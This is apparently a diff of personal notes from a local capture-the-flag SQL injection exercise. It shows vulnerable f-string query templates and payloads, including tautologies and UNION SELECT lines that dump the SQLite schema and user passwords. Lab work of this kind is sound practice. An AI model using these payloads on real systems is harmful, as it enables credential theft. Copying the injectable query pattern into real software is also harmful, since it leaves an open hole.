@@ -182,9 +182,13 @@ curl -b jar.txt http://challenge.localhost/session
 
 ; I used very basic tutorial to solve this level: https://www.w3schools.com/sql/sql_injection.asp
 
-; Drafts
+; Drafts; payloads
 query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }"
 query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
 -----
 5 or 1=1
 ' or ''='
+; blockbox; I don't knwo what tables, I have
+" UNION SELECT sql FROM sqlite_master --
+; then the payloads
+" UNION SELECT password FROM users --
